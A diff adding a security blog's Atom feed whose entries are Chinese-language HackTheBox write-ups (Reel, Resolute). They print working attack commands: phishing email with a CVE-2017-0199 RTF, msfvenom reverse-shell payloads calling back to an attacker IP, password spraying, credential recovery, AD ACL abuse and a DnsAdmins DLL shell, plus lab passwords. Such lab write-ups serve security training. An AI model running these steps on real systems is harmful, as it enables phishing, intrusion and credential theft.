@@ -1,0 +1,1195 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://wghahaha.github.io</id>
+    <title>white0123</title>
+    <updated>2024-04-28T06:39:47.463Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://wghahaha.github.io"/>
+    <link rel="self" href="https://wghahaha.github.io/atom.xml"/>
+    <subtitle>永远保持第一天接触网络安全的热情</subtitle>
+    <logo>https://wghahaha.github.io/images/avatar.png</logo>
+    <icon>https://wghahaha.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, white0123</rights>
+    <entry>
+        <title type="html"><![CDATA[ Active Directory 101-Reel]]></title>
+        <id>https://wghahaha.github.io/post/reel/</id>
+        <link href="https://wghahaha.github.io/post/reel/">
+        </link>
+        <updated>2023-12-12T07:59:18.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
+<p>一台很有难度的靶机 设计到了smtp用户枚举 邮件钓鱼 ml凭据恢复、管理员组添加等。</p>
+<p>这台太难了 好多都不会。后面基本上都是照着师傅们打的。</p>
+<p>文章转载来源于 https://www.freebuf.com/articles/system/349206.html</p>
+<h2 id="信息收集">信息收集</h2>
+<pre><code>nmap -Pn -p- -sV -sC -A 10.10.10.77 -oA nmap_Reel
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914273_636a5a21bc7fcae7bbaa4.jpeg" alt="截屏2021-11-08 上午10.14.13" loading="lazy"></figure>
+<pre><code>扫描结果显示目标开放了21、22、25端口
+
+21端口
+利用匿名登录漏洞可直接登陆目标 FTP 服务
+</code></pre>
+<pre><code>ftp 10.10.10.77
+## 账号/密码：anonymous/anonymous
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914275_636a5a23c85d5a4dbb382.jpeg" alt="截屏2021-11-08 上午11.30.37" loading="lazy"></figure>
+<h3 id="ftp信息收集">ftp信息收集</h3>
+<p>进入<code>documents</code>目录并尝试下载所有文件</p>
+<pre><code>ftp &gt; cd documents
+ftp &gt; ls
+ftp &gt; get readme.txt
+ftp &gt; get AppLocker.docx
+ftp &gt; get &quot;Windows Event Forwarding.docx&quot;
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914277_636a5a25c7cfbc19c8d90.jpeg" alt="截屏2021-11-08 上午11.33.46" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914279_636a5a27adeb1d4af97a9.jpeg" alt="截屏2021-11-08 上午11.34.18" loading="lazy"></figure>
+<p>经翻译后三个文件内容分别如下：</p>
+<ul>
+<li>AppLocker.docx：要记录的 AppLocker 程序 - exe、msi 和脚本（ps1、vbs、cmd、bat、js）的哈希规则有效</li>
+<li>readme.txt：请给我发电子邮件任何 rtf 格式程序 - 我会审查和转换。新格式/转换后的文件将保存在这里</li>
+<li>Windows Event Forwarding.docx：记录了日志转发命令</li>
+</ul>
+<p>使用 exiftool 分别查看元数据，在文档<code>Windows Event Forwarding.docx</code>中发现邮箱地址<code>nico@megabank.com</code></p>
+<pre><code>exiftool &quot;Windows Event Forwarding.docx&quot;
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914281_636a5a2960180c32a84b7.jpeg" alt="截屏2021-11-08 下午2.30.45" loading="lazy"></figure>
+<h2 id="上线nico">上线[nico]</h2>
+<h3 id="smtp用户名枚举">smtp用户名枚举</h3>
+<p>目标存在 smtp 服务，因此可尝试通过用户枚举来获取邮箱用户。枚举 smtp 用户存在以下三种模式：</p>
+<pre><code class="language-yaml">VERY：验证邮箱是否存在
+EXPN：验证邮箱列表是否存在
+RCPT TO：指定收件人地址
+</code></pre>
+<h4 id="手动枚举">手动枚举</h4>
+<p>验证发现的邮箱账户<code>nico@megabank.com</code>，使用<code>vrfy</code>、<code>expn</code>命令查询该账户失败</p>
+<pre><code class="language-bash">telnet 10.10.10.77 25
+&gt; HELO
+&gt; HELO mac
+&gt; VRFY nico@megabank.com
+&gt; EXPN nico@megabank.com
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914283_636a5a2b4e612fb7a14fc.jpeg" alt="截屏2021-11-08 下午4.05.31" loading="lazy"></figure>
+<p>而使用<code>rcpt to</code>命令验证显示该账户存在</p>
+<pre><code class="language-bash">&gt; mali from a@abc.com
+&gt; rcpt to:nico@megabank.com
+&gt; rcpt to:root@aaa.com
+&gt; rcpt to:a@megabank.com
+&gt; rcpt to:root@megabank.com
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914284_636a5a2cf2ac26106c8b0.jpeg" alt="截屏2021-11-08 下午4.00.17" loading="lazy"></figure>
+<h4 id="自动枚举">自动枚举</h4>
+<p>使用自动化的 SMTP 用户名枚举工具能够极大地提升效率，当然前提是要存在相应的字典文件，通过对<code>nico</code>、<code>@htb</code>、<code>@megabank</code>这几个关键变量进行变形后构造用户名字典<code>user.txt</code>如下：</p>
+<pre><code class="language-yaml">reel
+administrator
+admin
+root
+reel@htb
+reel@htb.local
+reel@reel.htb
+administrator@htb
+admin@htb
+root@htb
+sadfasdfasdfasdf@htb
+nico@megabank.com
+htb@metabank.com
+</code></pre>
+<p>使用 smtp-user-enum 对用户名仅需部分自动枚举，结果显示只有<code>@htb</code>账户和目标邮箱账户<code>nico@megabank.com</code>都存在。</p>
+<pre><code class="language-bash">smtp-user-enum -M RCPT -U user.txt -t 10.10.10.77
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914286_636a5a2e735cd7ddb3570.jpeg" alt="截屏2021-11-08 下午4.54.17" loading="lazy"></figure>
+<h3 id="邮件钓鱼">邮件钓鱼</h3>
+<p>在<code>readme.txt</code>中提示可发送 rtf 格式的文件，而利用 rtf 可执行 RCE 漏洞（CVE-2017-0199），漏洞详细利用步骤如下：</p>
+<pre><code class="language-shell">1、向目标用户发送恶意的 rtf 文件
+2、在易受攻击的 word 版本中打开该文件将导致代码执行，恶意代码存在于 olelink 对象中
+3、当打开文档后 winword.exe 会向远程服务器发送 http 请求以检索恶意的 HTA 文件
+4、收到响应的则是一个带有恶意脚本的假的 rtf 文件，winword.exe 通过 COM 对象查找 application/hta 的文件处理程序
+5、导致 Microsoft HTA 应用程序（mshta.exe）下载并执行包含 Powershell 命令的 Visual Basic 脚本
+</code></pre>
+<p>简单来说就是向目标发送带有恶意 rtf 的邮件，用户一旦打开 rtf 文件后就会加载远程的恶意 hta 文件处理程序并执行相应命令。</p>
+<h4 id="生成恶意hta文件">生成恶意hta文件</h4>
+<p>使用 msf 生成 hta 类型的反弹shell木马</p>
+<pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.17 lport=2222 -f hta-psh -o msfv.hta
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914288_636a5a3022437cccdb713.jpeg" alt="截屏2021-11-08 下午11.36.11" loading="lazy"></figure>
+<h4 id="生成请求恶意hta的rtf文件">生成请求恶意hta的rtf文件</h4>
+<p>使用 github 上的漏洞利用工具来生成 rtf 文件，该工具的相关命令参数如下：</p>
+<p><strong>工具地址：https://github.com/bhdresh/CVE-2017-0199</strong></p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914289_636a5a31a2655ab067ca2.jpeg" alt="截屏2021-11-08 下午9.58.05" loading="lazy"></figure>
+<p>成功生成用于请求远程 hta 程序的 rtf 文件</p>
+<pre><code class="language-bash">python cve-2017-0199_toolkit.py -M gen -w mac.rtf -u http://10.10.14.17/msfv.hta -t rtf -x 0
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914291_636a5a337c91e5698a260.jpeg" alt="截屏2021-11-08 下午11.42.40" loading="lazy"></figure>
+<p>使用 python 开启 http 服务</p>
+<pre><code class="language-shell">python -m SimpleHTTPServer 80
+</code></pre>
+<p>同时监听 2222 端口用于接收反弹shell</p>
+<pre><code class="language-shell">nc -nvlp 2222
+</code></pre>
+<h4 id="发送邮件获取权限">发送邮件获取权限</h4>
+<p>通过 sendemail 向目标邮件账户发送带有恶意 rtf 文件的邮件，等待用户打开邮件</p>
+<pre><code class="language-bash">sendEmail -f mac@megabank.com -t nico@megabank.com -u &quot;Invoice Attached&quot; -m &quot;You are overdue payment&quot; -a mac.rtf -s 10.10.10.77 -v 
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914292_636a5a34e8a90ebd4bc9c.jpeg" alt="截屏2021-11-09 上午12.25.25" loading="lazy"></figure>
+<p>过一段时间后成功拿到反弹shell<br>
+<img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914294_636a5a3678a52b69393cf.jpeg" alt="截屏2021-11-09 上午12.27.49" loading="lazy"></p>
+<p>在当前用户桌面上成功拿到第一个flag</p>
+<pre><code class="language-bash">dir c:\Users\nico\Desktop
+type c:\Users\nico\Desktop\user.txt
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914296_636a5a3841f4ff3e3ec6d.jpeg" alt="截屏2021-11-09 上午12.38.45" loading="lazy"></figure>
+<h3 id="msf利用">msf利用</h3>
+<p>当然也可以使用 MSF 来完成以上操作</p>
+<pre><code class="language-bash">msfconsole 
+msf &gt; use exploit/windows/fileformat/office_word_hta
+msf &gt; set lhost 10.10.14.17
+msf &gt; set lport 4444
+msf &gt; set srvhost 10.10.14.17
+msf &gt; run
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914297_636a5a39be1f08da851b0.jpeg" alt="截屏2021-11-09 上午1.31.03" loading="lazy"></figure>
+<p>向目标用户发送钓鱼邮件</p>
+<pre><code class="language-bash">sendEmail -f mac@megabank.com -t nico@megabank.com -u &quot;Invoice Attached&quot; -m &quot;You are overdue payment&quot; -a /root/.msf4/local/msf.doc -s 10.10.10.77 -v 
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914299_636a5a3b686146c16fec5.jpeg" alt="截屏2021-11-09 上午1.19.05" loading="lazy"></figure>
+<p>成功收到 meterpreter<br>
+<img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914300_636a5a3cd211bf59a2321.jpeg" alt="截屏2021-11-09 上午1.32.26" loading="lazy"></p>
+<h2 id="横向移动tom">横向移动[tom]</h2>
+<h3 id="凭据恢复">凭据恢复</h3>
+<p>在当前用户桌面上发现敏感文件<code>cred.xml</code>，该文件是 PSCredential 对象当中<code>Export-CliXml</code>方法输出的 XML 文档，而 PSCredential 对象在 Powershell 中主要用于存储用户名、密码和凭据</p>
+<pre><code class="language-yaml">type c:\Users\nico\Desktop\cred.xml
+</code></pre>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914302_636a5a3e64cc9ebef85cd.jpeg" alt="截屏2021-11-09 上午1.33.34" loading="lazy"></figure>
+<p>使用 PSCredential 对象中的<code>Import-CliXml</code>方法导入该文件，调用<code>GetNetworkCredential</code>方法可从中直接提取明文密码，成功拿到账号密码<code>Tom/1ts-mag1c!!!</code></p>
+<pre><code class="language-bash">powershell -c &quot;$cred = Import-CliXml -Path c:\Users\nico\Desktop\cred.xml;$cred.GetNetworkCredential() | Format-List *&quot;
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914303_636a5a3fe6a9b2ee3ebc9.jpeg" alt="截屏2021-11-09 上午1.41.06" loading="lazy"></figure>
+<h3 id="ssh登录">ssh登录</h3>
+<p>使用拿到的账号密码登录目标 SSH 服务</p>
+<pre><code class="language-bash">ssh tom@10.10.10.77
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914305_636a5a4142c1c9f79b10b.jpeg" alt="截屏2021-11-09 上午1.46.04" loading="lazy"></figure>
+<p>进入该用户桌面后在<code>AD Audit\BloodHound\Ingestors</code>目录中找到<code>acls.csv</code>文件</p>
+<pre><code class="language-bash">cd &quot;C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors&quot;
+dir
+</code></pre>
+<figure data-type="image" tabindex="19"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914306_636a5a42a0037427c5580.jpeg" alt="截屏2021-11-09 上午1.48.42" loading="lazy"></figure>
+<h2 id="横向移动-claire">横向移动 [claire]</h2>
+<h3 id="csv信息收集">csv信息收集</h3>
+<p>在本地搭建 SMB 服务用于文件传输</p>
+<pre><code class="language-bash">python3 smbserver.py mac ~/hackthebox/Machines/Reel 
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914308_636a5a445eabf3b1e9f3a.jpeg" alt="截屏2021-11-09 上午1.54.04" loading="lazy"></figure>
+<p>利用 SMB 协议下载该文件到本地</p>
+<pre><code class="language-bash">copy acls.csv \\10.10.14.17\mac
+</code></pre>
+<figure data-type="image" tabindex="21"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914309_636a5a45cbadfa5d17dd8.jpeg" alt="截屏2021-11-09 上午1.56.45" loading="lazy"></figure>
+<p>打开 csv 表格文件后发现其中包含了域中各个用户以及用户组之间的关系<br>
+<img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914311_636a5a474e5e684394181.jpeg" alt="截屏2021-11-09 上午1.59.20" loading="lazy"></p>
+<p>经搜索后发现当前用户<code>tom</code>对用户<code>claire</code>拥有<code>WriteOwner</code>权限<br>
+<img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914312_636a5a48e7ecd8a416dbd.jpeg" alt="截屏2021-11-09 上午2.01.14" loading="lazy"></p>
+<p>用户<code>claire</code>又对<code>Backup_Admins</code>组对象拥有<code>WriteDacl</code>权限，因此拥有用户<code>tom</code>的权限就可以控制用户<code>claire</code>并最终拿到<code>Backup_Admins</code>用户组权限<br>
+<img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914314_636a5a4a203247502f5f6.jpeg" alt="截屏2021-11-09 上午2.02.53" loading="lazy"></p>
+<h3 id="bloodhound表格分析">BloodHound表格分析</h3>
+<p>BloodHound 可对大型域环境进行分析并将其可视化输出，如果未安装可使用以下命令进行安装</p>
+<pre><code class="language-bash">apt install bloodhound
+</code></pre>
+<p>安装完后开启 neo4j 数据库，如果出现以下报错<br>
+<img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914315_636a5a4b81277d446caee.jpeg" alt="截屏2021-11-09 上午9.13.11" loading="lazy"></p>
+<p>出现报错创建<code>log</code>目录和对应日志<code>neo4j.log</code></p>
+<pre><code class="language-bash">mkdir /usr/share/neo4j/logs
+touch /usr/share/neo4j/logs/neo4j.log
+</code></pre>
+<p>再次开启 neo4j 数据库</p>
+<pre><code class="language-bash">neo4j start
+</code></pre>
+<figure data-type="image" tabindex="22"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914317_636a5a4d03de22a2eec13.jpeg" alt="截屏2021-11-09 上午9.18.15" loading="lazy"></figure>
+<p>使用默认账号密码登录 BloodHound</p>
+<pre><code class="language-yaml">username: neo4j
+password: neo4j
+</code></pre>
+<figure data-type="image" tabindex="23"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914318_636a5a4e7743020e71dba.jpeg" alt="截屏2021-11-09 上午9.21.24" loading="lazy"></figure>
+<p>首次登录需要重新设置密码。在其中上传数据可寻找域内各个用户、用户组的对应关系<br>
+<img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914319_636a5a4fa49ddc9c08333.jpeg" alt="截屏2021-11-09 上午9.57.28" loading="lazy"></p>
+<h3 id="修改claire用户密码">修改claire用户密码</h3>
+<p>导入 PowerSploit 中的<code>powerview.ps1</code></p>
+<pre><code class="language-bash">powershell //切换到powershell命令行
+. .\PowerView.ps1 //将PowerView导入
+</code></pre>
+<p>把当前用户<code>tom</code>设置为<code>claire</code>用户的 ACL 的所有者并授予其修改密码的权限</p>
+<pre><code class="language-bash">Set-DomainObjectOwner -identity claire -OwnerIdentity tom
+Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
+</code></pre>
+<p>设置<code>claire</code>的密码为<code>MagicMac123!@#</code></p>
+<pre><code class="language-bash">$cred = ConvertTo-SecureString &quot;MagicMac123!@#&quot; -AsPlainText -force
+Set-DomainUserPassword -identity claire -accountpassword $cred
+</code></pre>
+<figure data-type="image" tabindex="24"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914320_636a5a50ed31922a40163.jpeg" alt="截屏2021-11-09 上午2.48.36" loading="lazy"></figure>
+<h3 id="ssh登陆">ssh登陆</h3>
+<p>使用重新设置的密码登录用户<code>claire</code></p>
+<pre><code class="language-bash">ssh claire@10.10.10.17
+</code></pre>
+<figure data-type="image" tabindex="25"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914322_636a5a526991d930e992d.jpeg" alt="截屏2021-11-09 上午2.54.38" loading="lazy"></figure>
+<p>查看<code>backup_admins</code>组成员，目前该组中只有<code>ranj</code>用户</p>
+<pre><code class="language-bash">net group backup_admins
+</code></pre>
+<figure data-type="image" tabindex="26"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914323_636a5a53bc32a0e348cfd.jpeg" alt="截屏2021-11-09 上午2.57.13" loading="lazy"></figure>
+<p>成功将<code>claire</code>用户添加到<code>backup_admins</code>用户组下，不过需重新登录，否则无法生效</p>
+<pre><code class="language-bash">net group backup_admins claire /add
+net group backup_admins
+</code></pre>
+<figure data-type="image" tabindex="27"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914325_636a5a557d583de94cd0d.jpeg" alt="截屏2021-11-09 上午2.58.41" loading="lazy"></figure>
+<h2 id="权限提升administrator">权限提升[administrator]</h2>
+<h3 id="信息收集-2">信息收集</h3>
+<p>查看当前用户对管理员目录<code>c:\users\administrator</code>的权限，发现<code>Backup_Admins</code>组对管理员目录拥有访问权限</p>
+<pre><code class="language-bash">icalcs Administrator
+</code></pre>
+<figure data-type="image" tabindex="28"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914327_636a5a574d2964af00617.jpeg" alt="截屏2021-11-09 上午3.37.11" loading="lazy"></figure>
+<p>因此可直接查看管理员用户桌面中的文件，成功发现第二个 flag</p>
+<pre><code class="language-bash">cd c:\Users\Administrator\Desktop
+ls
+</code></pre>
+<figure data-type="image" tabindex="29"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914329_636a5a5973a72f6852edf.jpeg" alt="截屏2021-11-09 上午3.37.32" loading="lazy"></figure>
+<p>但尝试查看<code>root.txt</code>却被拒绝</p>
+<pre><code class="language-bashh">type root.txt
+</code></pre>
+<figure data-type="image" tabindex="30"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914332_636a5a5c5c0de7af602c3.jpeg" alt="截屏2021-11-09 上午3.37.57" loading="lazy"></figure>
+<h3 id="管理员登陆">管理员登陆</h3>
+<p>在备份目录<code>Backup Scripts</code>中遍历密码，成功找到管理员密码<code>Cr4ckMeIfYouC4n!</code></p>
+<pre><code class="language-bash">cd &quot;Back Scripts&quot;
+type * | findstr pass
+</code></pre>
+<figure data-type="image" tabindex="31"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914333_636a5a5d9026f3f9b1588.jpeg" alt="截屏2021-11-09 上午3.39.13" loading="lazy"></figure>
+<p>通过该密码可成功登录管理员并拿到第二个flag</p>
+<pre><code class="language-bash">ssh administrator@10.10.10.77
+</code></pre>
+<figure data-type="image" tabindex="32"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914335_636a5a5f309ef71cf43ad.jpeg" alt="截屏2021-11-09 上午3.44.25" loading="lazy"></figure>
+<h2 id="总结">总结</h2>
+<p>Reel 译为卷轴，它是目前唯一一个需要三次提权的靶机。通过信息收集发现目标存在 FTP 匿名登录漏洞，利用该漏洞登录 FTP 后下载其中的文件，分析 Word 文档的源数据时成功找到一个邮箱账户<code>nico@megabank.com</code>，经 SMTP 用户名枚举验证后可知该邮箱账户存在，与此同时 FTP 中的文件还提示可接受 rtf 格式的邮件，因此可将带有恶意 rtf 的钓鱼邮件发送给该邮箱账户。</p>
+<p>等待受害者点击后可成功获取用户<code>nico</code>的权限。在该用户桌面上发现用户<code>tom</code>的账号密码凭据，但其中的密码为密文，借助 GetNetworkCredential 方法可恢复为密码明文。有了<code>tom</code>的密码后就能够以<code>tom</code>的身份登陆ssh，搜索后发现在该用户桌面上存在反映域内用户与用户组关系的表格，其中显示用户<code>tom</code>对用户<code>claire</code>拥有<code>WriteOwner</code>权限，而用户<code>claire</code>对<code>Backup_Admins</code>组拥有<code>WriteDacl</code>权限。</p>
+<p>利用 PowerView 工具可配合用户<code>tom</code>的权限修改用户<code>claire</code>密码，使用修改后的密码可成功登录用户<code>claire</code>，登陆成功后将当前用户添加至<code>Backup_Admins</code>用户组当中，而该用户组拥有管理员桌面的访问权限，尝试读取 flag 信息失败，但可读取备份目录中的管理员密码，并最终使用该密码登陆管理员成功。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Linux内网渗透]]></title>
+        <id>https://wghahaha.github.io/post/linux-nei-wang-shen-tou/</id>
+        <link href="https://wghahaha.github.io/post/linux-nei-wang-shen-tou/">
+        </link>
+        <updated>2023-12-11T10:37:24.000Z</updated>
+        <content type="html"><![CDATA[<p>https://www.cnblogs.com/yokan/p/16300797.html</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ Active Directory 101-Resolute]]></title>
+        <id>https://wghahaha.github.io/post/resolute/</id>
+        <link href="https://wghahaha.github.io/post/resolute/">
+        </link>
+        <updated>2023-12-11T09:09:07.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
+<p>这一台机器相比较前几台机器 更加简单 难点主要在于最后提权那里。</p>
+<h2 id="信息收集">信息收集</h2>
+<pre><code>Nmap scan report for 10.10.10.169
+Host is up (0.39s latency).
+Not shown: 65476 closed ports, 36 filtered ports
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-10-12 08:19:11Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+49674/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc        Microsoft Windows RPC
+49680/tcp open  msrpc        Microsoft Windows RPC
+49709/tcp open  msrpc        Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=10/12%Time=634676E0%P=x86_64-pc-linux-gnu%r(DNS
+SF:VersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
+SF:\x04bind\0\0\x10\0\x03&quot;);
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.02: 
+|_    Message signing enabled and required
+|_smb2-time: Protocol negotiation failed (SMB2)
+</code></pre>
+<h2 id="密码喷洒">密码喷洒</h2>
+<p>使用控身份连接到RPC</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211164027720.png" alt="image-20231211164027720" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211164059793.png" alt="image-20231211164059793" loading="lazy"></figure>
+<p>得到一组账号密码 尝试进行登陆。</p>
+<p>经过crackmapexec验证发现该用户不能登录，我们把前面发现的用户名都存入userlist.txt 然后使用crackmapexec进行密码喷洒</p>
+<pre><code>crackmapexec smb 10.10.10.169 -u userlist.txt -p 'Welcome123!' --continue-on-success
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1665921251_634bf0e3b0b5465c7da4f.png" alt="img" loading="lazy"></figure>
+<p>喷洒出可登录的用户 直接登录</p>
+<pre><code>evil-winrm -i 10.10.10.169 -P 5985 -u melanie -p 'Welcome123!'
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211164322432.png" alt="image-20231211164322432" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211164656637.png" alt="image-20231211164656637" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211164902807.png" alt="image-20231211164902807" loading="lazy"></figure>
+<p>发现了一个存有ryan用户名和密码的txt文件</p>
+<h2 id="dnsadmin组实现权限提升">dnsadmin组实现权限提升</h2>
+<p>我们通过这个账号密码 尝试进行登录。</p>
+<pre><code>evil-winrm -i 10.10.10.169 -P 5985 -u ryan -p 'Serv3r4Admin4cc123!'
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211165046789.png" alt="image-20231211165046789" loading="lazy"></figure>
+<p>成功进入。</p>
+<p>我们在ryan用户的桌面发现了一个note.txt文件，内容如下：</p>
+<pre><code>due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
+翻译：由于更改冻结，任何系统更改（除了管理员帐户的更改）将在 1 分钟内自动恢复
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211165209565.png" alt="image-20231211165209565" loading="lazy"></figure>
+<p>该组可以进行远程加载DLL 可通过构造恶意的DLL实现反弹shell</p>
+<p>https://3gstudent.github.io/backup-3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8dnscmd%E5%9C%A8DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDDll/</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211165405531.png" alt="image-20231211165405531" loading="lazy"></figure>
+<p>生成恶意的DLL马</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211165554161.png" alt="image-20231211165554161" loading="lazy"></figure>
+<p>远程加载恶意DLL以及重启DNS服务操作。</p>
+<p>注意：在实际的生产环境中重新DNS服务属于危险操作。</p>
+<p>观察反弹端口端的情况</p>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231211165726735.png" alt="image-20231211165726735" loading="lazy"></figure>
+<p>成功反弹过一个高权限的shell 实现提权效果。</p>
+<p>还可以将恶意dll的操作设置为重置管理员密码 然后使用新的密码 进行横向操作。</p>
+<h2 id="总结">总结</h2>
+<p>这一台靶机相对比较轻松，最后提权那里对于DNSadmin不太熟悉，卡了一会。大概的思路就是 通过信息收集 和枚举通过空身份登录到RPC然后枚举出了一堆账号和一组密码 通过密码喷洒 得到一组可以登录的账号密码，成功登录上去。然后就是一顿翻，最后翻到隐藏文件中有一个txt写了ryan的账号密码 通过evil winrm成功登录上去后 发现该账号是DNS admin组的  该组可以实现远程调用DLL 然后使用MSF生成恶意的DLL 填好端口和IP信息 最后实现了反弹shell的效果 这个shell是一个高权限的shell 成功实现了反弹shell的操作</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[域内攻防之委派攻击]]></title>
+        <id>https://wghahaha.github.io/post/yu-nei-gong-fang-zhi-wei-pai-gong-ji/</id>
+        <link href="https://wghahaha.github.io/post/yu-nei-gong-fang-zhi-wei-pai-gong-ji/">
+        </link>
+        <updated>2023-12-11T06:26:50.000Z</updated>
